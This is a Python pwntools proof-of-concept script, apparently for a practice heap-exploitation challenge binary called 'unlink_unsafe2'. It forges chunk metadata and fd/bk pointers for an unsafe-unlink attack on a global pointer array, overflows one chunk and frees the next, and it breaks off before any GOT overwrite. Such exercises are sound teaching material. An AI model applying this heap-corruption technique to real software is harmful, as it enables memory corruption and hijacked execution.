# unlink2_poc.py
from pwn import *
p = process("./unlink_unsafe2")
def add(data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx, size, data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendlineafter(":",str(size))
	print p.sendlineafter(":",str(data))
def exit_func():
	print p.sendlineafter(">","4")

elf = ELF('unlink_unsafe2')
heap_ptr = elf.symbols['ptr']
shell = elf.symbols['getshell']
exit = elf.got['exit']
third_heap_ptr = heap_ptr+16
    
add("AAAA") # 1
add("AAAA") # 2
add("AAAA") # 3
add("AAAA") # 4

# 1
payload = p64(0)
payload += p64(0)
payload += p64(third_heap_ptr-24) # P->fd->bk = P
payload += p64(third_heap_ptr-16) # P->bk->fd = P

# 2
payload += "A"*0xe0
payload += p64(0x100) # prev_size
payload += p64(0x110) # inuse 0
pause()

# ptr[2] <- 0x130
edit(2, 0x130, payload)
pause()


free(3)
